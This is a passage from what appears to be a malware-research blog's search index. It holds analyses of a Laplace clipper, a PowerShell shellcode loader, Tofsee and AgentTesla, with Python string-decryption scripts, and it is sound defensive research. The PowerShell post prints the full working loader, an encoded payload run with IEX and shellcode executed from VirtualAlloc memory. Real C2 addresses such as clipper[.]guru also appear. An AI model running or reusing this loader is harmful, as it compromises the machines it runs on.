?partner=([0-9]+)&amp;token=([a-zA-Z0-9]+))|(tz[1-3][1-9A-HJ-NP-Za-km-z]{33})|(addr1[a-z0-9]+)|(cosmos1[a-z0-9]{38})|(R[a-zA-Z0-9]{33})|([A-Z2-7]{58})|([1-9A-HJ-NP-Za-km-z]{44})) . Get . The get endpoint is used to get attacker controled data to replace the intercepted clipboard data. The clipboard data is sent in the address parameter. . http[:]//clipper[.]guru/bot/get?address=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D482147969%26token%3Db&amp;key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb .",
            "url": "https://research.openanalysis.net/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html",
            "relUrl": "/golang/laplace/python/research/ida/goresym/alphagolang/2022/11/27/laplace.html",
            "date": " ‚Ä¢ Nov 27, 2022"
        }
        
    
  
    
        ,"post28": {
            "title": "PowerShell Loading Shellcode",
            "content": "Overview . We have this PowerShell script that will eventually deploy some shellcode. Our job is to analyze this, and learn a little along the way. . Sample . Analysis . PowerShell Analysis . We used cyberchef to do our analysis, the saved recipe can be used to extract similar loaders, just remember to change the XOR key. Paste the URL below into your browser to access the pre-built cyberchef recipe. . https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)Decode_text(&#39;UTF-16LE%20(1200)&#39;)Regular_expression(&#39;User%20defined&#39;,&#39;(%5Ba-zA-Z0-9%2B/%5D(%3D)%7B0,2%7D)%7B40,%7D&#39;,true,true,false,false,false,false,&#39;List%20matches&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)Gunzip()Regular_expression(&#39;User%20defined&#39;,&#39;(%5Ba-zA-Z0-9%2B/%5D(%3D)%7B0,2%7D)%7B40,%7D&#39;,true,true,false,false,false,false,&#39;List%20matches&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)XOR(%7B&#39;option&#39;:&#39;Decimal&#39;,&#39;string&#39;:&#39;35&#39;%7D,&#39;Standard&#39;,false) . Stage 1 . The sample comes as a base64 encoded blob containing wide string PowerShell code. . $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&quot;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&quot;)); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); . Stage 2 . Once the first stage has been decoded we have some more base64 encoded PowerShell that is also gzip compressed. . Set-StrictMode -Version 2 $DoIt = @&#39; function func_get_proc_address { Param ($var_module, $var_procedure) $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39; &#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;) $var_gpa = $var_unsafe_native_methods.GetMethod(&#39;GetProcAddress&#39;, [Type[]] @(&#39;System.Runtime.InteropServices.HandleRef&#39;, &#39;string&#39;)) return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($var_module)))), $var_procedure)) } function func_get_delegate_type { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate]) $var_type_builder.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#39;Runtime, Managed&#39;) $var_type_builder.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $var_return_type, $var_parameters).SetImplementationFlags(&#39;Runtime, Managed&#39;) return $var_type_builder.CreateType() } [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf05MSUwNFhUbGw0bExYRDRAWFBsTERQQEBEaEBQTFxQQEBMjL2yHcQ==&#39;) for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 } $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))) $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length) $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void]))) $var_runme.Invoke([IntPtr]::Zero) &#39;@ If ([IntPtr]::size -eq 8) { start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job } else { IEX $DoIt } . Stage 3 . The final PowerShell stage is used to base64 decode and XOR decrypt shellcode that is loaded as the final stage. . Shellcode Analysis . 2eb435f69a445e4ca80fb0353d067dcd9d4b0dbf757978d46c27a5dd147a2ae8 . The shellcode containst functionality to download and run a second stage (shellcode) using a hard coded named pipe . pipe mojo.5688.8052.3578027332937047330. To resolved APIs the shellcode uses the old Metasploit ROT-13 hash resolving algorithm. . One interesting trick observed in the shellcode is the use of that return address on the stack to pass arguments to non-returning functions. .",
            "url": "https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html",
            "relUrl": "/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html",
            "date": " ‚Ä¢ Nov 24, 2022"
        }
        
    
  
    
        ,"post29": {
            "title": "Tofsee",
            "content": "Overview . Samples . 96baba74a907890b995f23c7db21568f7bfb5dbf417ed90ca311482b99702b72 malshare . References . Malpedia refs | Tofsee ‚Äì modular spambot | . Analysis . According to CERTPL (2016) ref . The C2 IP address list is hardcoded in the binary in an encrypted form. The algorithm used for obfuscation is very simple ‚Äì it XORs the message with the hardcoded key. Data decrypts to three IP+port pairs ‚Äì at least in the analyzed sample, the port was equal to 443 for all of them. The probable reason is to conceal communication by using port dedicated for SSL traffic. . Decrypt Strings . data = bytes.fromhex(&#39;97db17556bbee0734195d17d&#39;) out = [] key_xor = 0xE4 key_add = 0xc8 for i in range(len(data)): out.append(key_xor ^ data[i]) if bool(i%2): key_xor = (key_xor + key_add - 1) &amp; 0xff else: key_xor = (key_xor + key_add + 1) &amp; 0xff print(bytes(out)) . b&#39;svchost.exe x00&#39; . out = [] key_xor = 0xE4 key_add = 0xc8 flip = True for c in data: out.append(c ^ key_xor) if flip: key_xor = (key_xor + key_add + 1) &amp; 0xff else: key_xor = (key_xor + key_add - 1) &amp; 0xff flip = not flip print(bytes(out)) . b&#39;svchost.exe x00&#39; . def decrypt(data,key_xor,key_add): out = [] flip = True for c in data: out.append(c ^ key_xor) if flip: key_xor = (key_xor + key_add + 1) &amp; 0xff else: key_xor = (key_xor + key_add - 1) &amp; 0xff flip = not flip return bytes(out) decrypt(bytes.fromhex(&#39;97db17556bbee0734195d17d&#39;), 0xE4, 0xc8) . b&#39;svchost.exe x00&#39; . Locate Encrypted Strings . 68 C8 00 00 00 push 0C8h ; &#39;√à&#39; 68 E4 00 00 00 push 0E4h ; &#39;√§&#39; 6A 2E push 2Eh ; &#39;.&#39; - size 68 AC 06 41 00 push offset byte_4106AC BF F8 22 41 00 mov edi, offset byte_4122F8 57 push edi E8 EE A3 FF FF call mw_decrypt . 68 C8 00 00 00 push 0C8h ; &#39;√à&#39; 68 E4 00 00 00 push 0E4h ; &#39;√§&#39; 6A 09 push 9 - size 68 88 07 41 00 push offset byte_410788 BF F8 22 41 00 mov edi, offset byte_4122F8 57 push edi E8 66 95 FF FF call mw_decrypt . 57 push edi 56 push esi 6A 17 push 17h - size 68 80 10 41 00 push offset byte_411080 55 push ebp E8 0C 49 FF FF call mw_decrypt . import pefile import re import struct def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) file_data = open(&#39;/tmp/toffsee.bin&#39;,&#39;rb&#39;).read() pe = pefile.PE(data=file_data) . rdata_vstart = None rdata_vend = None pe_base = pe.OPTIONAL_HEADER.ImageBase for s in pe.sections: if s.Name.startswith(b&#39;.rdata&#39;): rdata_vstart = s.VirtualAddress + pe_base rdata_vend = rdata_vstart + s.Misc_VirtualSize assert rdata_vstart is not None print(f&quot;rdata_vstart: {hex(rdata_vstart)}&quot;) print(f&quot;rdata_vend: {hex(rdata_vend)}&quot;) for s in pe.sections: if s.Name.startswith(b&#39;.rdata&#39;): rdata_vstart = s.VirtualAddress + pe_base rdata_vend = rdata_vstart + s.Misc_VirtualSize . rdata_vstart: 0x410000 rdata_vend: 0x411e9a . egg_string_push_loose = rb&#39; x6A(.) x68(....)(.){1,6} xe8&#39; egg_string_push_tight = rb&#39; x68(....) x68(....) x6A(.) x68(....)(.){1,6} xe8&#39; key_adds = [] key_xors = [] for m in re.finditer(egg_string_push_tight, file_data): key_adds.append(struct.unpack(&#39;&lt;I&#39;,m.group(1))[0]) key_xors.append(struct.unpack(&#39;&lt;I&#39;,m.group(2))[0]) key_xor = max(set(key_xors), key = key_xors.count) key_add = max(set(key_adds), key = key_adds.count) print(f&quot;xor: {hex(key_xor)} add:{hex(key_add)}&quot;) . xor: 0xe4 add:0xc8 . enc_strings = [] for m in re.finditer(egg_string_push_loose, file_data): str_len = struct.unpack(&#39;B&#39;, m.group(1))[0] str_vaddr = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] if rdata_vstart &lt;= str_vaddr &lt;= rdata_vend: enc_strings.append(pe.get_data(str_vaddr - pe_base, str_len)) strings = [] for e in enc_strings: tmp_str = decrypt(e, key_xor, key_add) if is_ascii(tmp_str): print(tmp_str) strings.append(tmp_str) . b&#39;c: Windows x00&#39; b&#39; system32 x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;MSConfig x00&#39; b&#39; /r x00&#39; b&#39;.exe x00&#39; b&#39;SYSTEM CurrentControlSet services x00&#39; b&#39;SYSTEM CurrentControlSet services x00&#39; b&#39;SYSTEM CurrentControlSet services x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;.exe x00&#39; b&#39;qazwsxed x00&#39; b&#39;%s%i%i%i%i.bat x00&#39; b&#39;@echo off r n:next_try r ndel &#34;%s&#34;&gt;nul r nif exist &#34;%s&#34; ( r nping 127.0.0.1 &gt;nul r ngoto next_try r n) r ndel %%0 r n x00&#39; b&#39;cmd /C move /Y &#34;%s&#34; %s r nsc config %s binPath= &#34;%s%s /d &#34;%s &#34;&#34; r nsc start %s r n x00&#39; b&#39;svchost.exe x00&#39; b&#39;ConsentPromptBehaviorAdmin x00&#39; b&#39;PromptOnSecureDesktop x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;MSConfig x00&#39; b&#39;.exe x00&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run x00&#39; b&#39;.exe x00&#39; b&#39;&#34;%s&#34; /u&#34;%s&#34; x00&#39; b&#39;.exe x00&#39; b&#39;ver=%d lid=%d nwin=%X/%d sid=%s nrep=%s n x00&#39; b&#39;:.repos x00&#39; b&#39; Local Settings:.repos x00&#39; b&#39; Local Settings Application Data Microsoft Windows UsrClass.dat.repos x00&#39; b&#39; wincookie.repos x00&#39; b&#39;TMP x00&#39; b&#39;Config x00&#39; b&#39;Control Panel Buses x00&#39; b&#39;Config x00&#39; b&#39;SOFTWARE Microsoft Buses x00&#39; b&#39;Config x00&#39; b&#39;Control Panel Buses x00&#39; b&#39;Config x00&#39; b&#39;SOFTWARE Microsoft Buses x00&#39; . decrypt(bytes.fromhex(&#39;97db154f70acf83b4c88dd106a79bbed642df4bd844d14dda46d34fdc48d541de4ad743d04cd945d24edb47d440dd49d642df4bd844d14dda46d34fdc48d541dbb010000018ec200486aa5f13449c3da1c2968d49d642df4bd844d14dda46d34fdc48d541de4ad743d04cd945d24edb47d440dd49d642df4bd844d14dda46d34fdc48d541dbb&#39;),0xe4,0xc8 ) . b&#39;svartalfheim.top x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00_ xact= x05CV]l x87 x11 x8cpD x17Gx x04 x9ci x19)9) x19 xe9y xe9 x19)9) x19i xf9i x19)9) x19 xe9y xe9 x19)9) x19i xf9i x19)9) x19 xe9y xe9 x19)9) x19i xf9i x19v&#39; . TODO: The C2 is stored in the .data section not the .rdata so we need to create a second regex to find this specific encrypted &quot;string&quot;. The following is an example. . 56 push esi 57 push edi 6A 02 push 2 BE 59 20 41 00 mov esi, offset unk_412059 5F pop edi 68 C8 00 00 00 push 0C8h ; &#39;√à&#39; 68 E4 00 00 00 push 0E4h ; &#39;√§&#39; 6A 40 push 40h ; &#39;@&#39; 56 push esi 56 push esi E8 39 60 FF FF call mw_decrypt .",
            "url": "https://research.openanalysis.net/tofsee/cpp/config/2022/11/20/tofsee.html",
            "relUrl": "/tofsee/cpp/config/2022/11/20/tofsee.html",
            "date": " ‚Ä¢ Nov 20, 2022"
        }
        
    
  
    
        ,"post30": {
            "title": "AgentTesla",
            "content": "Overview . Our goal is to write a static strings table decryptor for this AgentTesla variant. The strings are stored in a giant INT array so our goals are twofold. . statically identify .NET code sections using opcodes and extract some values from the code | statically identify the location of large int arrays in .NET binaries | . The obfuscator used is called obfuscar and it looks to be responsible for the strings encryption ref. . Note: After our analysis it was brought to my attention two existing string decryption solutions already exist for this obfuscator. They are listed below. . XenocodeRCE / DEObfuscar | DarkObb / DeObfuscar-Static | . Samples (unpacked) . 20f4ec03549be469302c0fcb5f55307680fd189aa733f90eb59cb2fbc34317cc malshare | cb3afdb1e17d5bdaf641e633434ac71855e5dcfdd21d66a565f0dc9844d30030 malshare | . References . dotnetfile | dnfile | dncil | . Analysis . The string location function. . The string decryption routine. . data=[152,155,209,208,215,214,129,224,239,142,196,197,134,239,236,159,215,214,130,202,205,198,197,196,203,236,253,252,233,211,208,234,194,195,215,228,227,208,0xff,254,190] out = &#39;&#39; for i in range(len(data)): out += chr(data[i] ^ (i &amp; 0xff) ^ 170) out . &#39;20yyyy-MM-dd HH:mm:ssyyyy_MM_dd_HH_mm_ss&lt;&#39; . Locate The Array . Byte Matching Regex To Locate The Array . We could possibly locate the array based on the fact that it is huge! Not many giant arrays in this malware. . 04 20 B1 2E 00 00 //ldc.i4 11953 8D 2B 00 00 01 // newarr [mscorlib]System.Byte . The drawbacks are that we will still need to parse the .NET to find the token with the data offset to the actual array being passed to RuntimeHelpers::InitializeArray. . .NET Parsing To Locate The Array . TARGET_PATH = &#39;/tmp/at.bin&#39; file_data = open(TARGET_PATH,&#39;rb&#39;).read() . import pefile import sys, struct, clr clr.AddReference(&quot;System.Memory&quot;) from System.Reflection import Assembly, MethodInfo, BindingFlags from System import Type DNLIB_PATH = &#39;/tmp/dnlib.dll&#39; clr.AddReference(DNLIB_PATH) import dnlib from dnlib.DotNet import * from dnlib.DotNet.Emit import OpCodes module = dnlib.DotNet.ModuleDefMD.Load(TARGET_PATH) . for mtype in module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 20: continue key_set = False block_set = False for ptr in range(20): if &quot;RuntimeHelpers::InitializeArray&quot; in method.Body.Instructions[ptr].ToString(): arr_inst = method.Body.Instructions[ptr-1] break dir(arr_inst) . [&#39;CalculateStackUsage&#39;, &#39;Clone&#39;, &#39;Create&#39;, &#39;CreateLdcI4&#39;, &#39;Equals&#39;, &#39;Finalize&#39;, &#39;GetArgumentType&#39;, &#39;GetHashCode&#39;, &#39;GetLdcI4Value&#39;, &#39;GetLocal&#39;, &#39;GetParameter&#39;, &#39;GetParameterIndex&#39;, &#39;GetSize&#39;, &#39;GetType&#39;, &#39;IsBr&#39;, &#39;IsBrfalse&#39;, &#39;IsBrtrue&#39;, &#39;IsConditionalBranch&#39;, &#39;IsLdarg&#39;, &#39;IsLdcI4&#39;, &#39;IsLdloc&#39;, &#39;IsLeave&#39;, &#39;IsStarg&#39;, &#39;IsStloc&#39;, &#39;MemberwiseClone&#39;, &#39;Offset&#39;, &#39;OpCode&#39;, &#39;Operand&#39;, &#39;Overloads&#39;, &#39;ReferenceEquals&#39;, &#39;SequencePoint&#39;, &#39;ToString&#39;, &#39;UpdateStack&#39;, &#39;__call__&#39;, &#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__lt__&#39;, &#39;__module__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__overloads__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;] . dir(arr_inst.Operand) . [&#39;Access&#39;, &#39;Attributes&#39;, &#39;Constant&#39;, &#39;CustomAttributes&#39;, &#39;CustomDebugInfos&#39;, &#39;DeclaringType&#39;, &#39;DeclaringType2&#39;, &#39;ElementType&#39;, &#39;Equals&#39;, &#39;FieldOffset&#39;, &#39;FieldSig&#39;, &#39;FieldType&#39;, &#39;Finalize&#39;, &#39;FullName&#39;, &#39;GetConstant_NoLock&#39;, &#39;GetFieldOffset_NoLock&#39;, &#39;GetFieldSize&#39;, &#39;GetHashCode&#39;, &#39;GetImplMap_NoLock&#39;, &#39;GetInitialValue_NoLock&#39;, &#39;GetMarshalType_NoLock&#39;, &#39;GetRVA_NoLock&#39;, &#39;GetType&#39;, &#39;HasConstant&#39;, &#39;HasConstantTag&#39;, &#39;HasCustomAttributeTag&#39;, &#39;HasCustomAttributes&#39;, &#39;HasCustomDebugInformationTag&#39;, &#39;HasCustomDebugInfos&#39;, &#39;HasDefault&#39;, &#39;HasFieldMarshal&#39;, &#39;HasFieldMarshalTag&#39;, &#39;HasFieldRVA&#39;, &#39;HasImplMap&#39;, &#39;HasLayoutInfo&#39;, &#39;HasMarshalType&#39;, &#39;ImplMap&#39;, &#39;InitialValue&#39;, &#39;InitializeCustomAttributes&#39;, &#39;InitializeCustomDebugInfos&#39;, &#39;IsAssembly&#39;, &#39;IsCompilerControlled&#39;, &#39;IsFamily&#39;, &#39;IsFamilyAndAssembly&#39;, &#39;IsFamilyOrAssembly&#39;, &#39;IsInitOnly&#39;, &#39;IsLiteral&#39;, &#39;IsNotSerialized&#39;, &#39;IsPinvokeImpl&#39;, &#39;IsPrivate&#39;, &#39;IsPrivateScope&#39;, &#39;IsPublic&#39;, &#39;IsRuntimeSpecialName&#39;, &#39;IsSpecialName&#39;, &#39;IsStatic&#39;, &#39;MDToken&#39;, &#39;MarshalType&#39;, &#39;MemberForwardedTag&#39;, &#39;MemberwiseClone&#39;, &#39;Module&#39;, &#39;Name&#39;, &#39;OrigRid&#39;, &#39;Overloads&#39;, &#39;RVA&#39;, &#39;ReferenceEquals&#39;, &#39;ResetConstant&#39;, &#39;ResetInitialValue&#39;, &#39;ResetMarshalType&#39;, &#39;ResetRVA&#39;, &#39;Rid&#39;, &#39;Signature&#39;, &#39;ToString&#39;, &#39;__call__&#39;, &#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__lt__&#39;, &#39;__module__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__overloads__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;attributes&#39;, &#39;constant&#39;, &#39;constant_isInitialized&#39;, &#39;customAttributes&#39;, &#39;customDebugInfos&#39;, &#39;declaringType2&#39;, &#39;fieldOffset&#39;, &#39;fieldOffset_isInitialized&#39;, &#39;get_Access&#39;, &#39;get_Attributes&#39;, &#39;get_Constant&#39;, &#39;get_CustomAttributes&#39;, &#39;get_CustomDebugInfos&#39;, &#39;get_DeclaringType&#39;, &#39;get_DeclaringType2&#39;, &#39;get_ElementType&#39;, &#39;get_FieldOffset&#39;, &#39;get_FieldSig&#39;, &#39;get_FieldType&#39;, &#39;get_FullName&#39;, &#39;get_HasConstant&#39;, &#39;get_HasConstantTag&#39;, &#39;get_HasCustomAttributeTag&#39;, &#39;get_HasCustomAttributes&#39;, &#39;get_HasCustomDebugInformationTag&#39;, &#39;get_HasCustomDebugInfos&#39;, &#39;get_HasDefault&#39;, &#39;get_HasFieldMarshal&#39;, &#39;get_HasFieldMarshalTag&#39;, &#39;get_HasFieldRVA&#39;, &#39;get_HasImplMap&#39;, &#39;get_HasLayoutInfo&#39;, &#39;get_HasMarshalType&#39;, &#39;get_ImplMap&#39;, &#39;get_InitialValue&#39;, &#39;get_IsAssembly&#39;, &#39;get_IsCompilerControlled&#39;, &#39;get_IsFamily&#39;, &#39;get_IsFamilyAndAssembly&#39;, &#39;get_IsFamilyOrAssembly&#39;, &#39;get_IsInitOnly&#39;, &#39;get_IsLiteral&#39;, &#39;get_IsNotSerialized&#39;, &#39;get_IsPinvokeImpl&#39;, &#39;get_IsPrivate&#39;, &#39;get_IsPrivateScope&#39;, &#39;get_IsPublic&#39;, &#39;get_IsRuntimeSpecialName&#39;, &#39;get_IsSpecialName&#39;, &#39;get_IsStatic&#39;, &#39;get_MDToken&#39;, &#39;get_MarshalType&#39;, &#39;get_MemberForwardedTag&#39;, &#39;get_Module&#39;, &#39;get_Name&#39;, &#39;get_OrigRid&#39;, &#39;get_RVA&#39;, &#39;get_Rid&#39;, &#39;get_Signature&#39;, &#39;implMap&#39;, &#39;implMap_isInitialized&#39;, &#39;initialValue&#39;, &#39;initialValue_isInitialized&#39;, &#39;marshalType&#39;, &#39;marshalType_isInitialized&#39;, &#39;name&#39;, &#39;rid&#39;, &#39;rva&#39;, &#39;rva_isInitialized&#39;, &#39;set_Access&#39;, &#39;set_Attributes&#39;, &#39;set_Constant&#39;, &#39;set_DeclaringType&#39;, &#39;set_DeclaringType2&#39;, &#39;set_FieldOffset&#39;, &#39;set_FieldSig&#39;, &#39;set_FieldType&#39;, &#39;set_HasDefault&#39;, &#39;set_HasFieldMarshal&#39;, &#39;set_HasFieldRVA&#39;, &#39;set_ImplMap&#39;, &#39;set_InitialValue&#39;, &#39;set_IsInitOnly&#39;, &#39;set_IsLiteral&#39;, &#39;set_IsNotSerialized&#39;, &#39;set_IsPinvokeImpl&#39;, &#39;set_IsRuntimeSpecialName&#39;, &#39;set_IsSpecialName&#39;, &#39;set_IsStatic&#39;, &#39;set_MarshalType&#39;, &#39;set_Name&#39;, &#39;set_RVA&#39;, &#39;set_Rid&#39;, &#39;set_Signature&#39;, &#39;signature&#39;] . print(hex(arr_inst.Operand.RVA)) print(hex(arr_inst.Operand.GetFieldSize())) . 0x260b8 0x2eb1 . pe = pefile.PE(data=file_data, fast_load=True) hex(pe.get_offset_from_rva(0x260b8)) . &#39;0x242b8&#39; . target_module = dnlib.DotNet.ModuleDefMD.Load(TARGET_PATH) def pct_ascii(s): return len([c for c in s if c &lt; 128 or c == 0]) / len(s) def decrypt(data, key): out = [] for i in range(len(data)): out.append((data[i] ^ i ^ key) &amp; 0xff) return bytes(out) def get_strings_table(target_module, pe): out = [] keys = [] for mtype in target_module.GetTypes(): if not mtype.HasMethods: continue for method in mtype.Methods: # The string decryption happens in a constructor if not method.IsConstructor: continue if not method.HasBody: continue if not method.Body.HasInstructions: continue if len(method.Body.Instructions) &lt; 30: continue key_set = False block_set = False key_flag = False for ptr in range(30): if 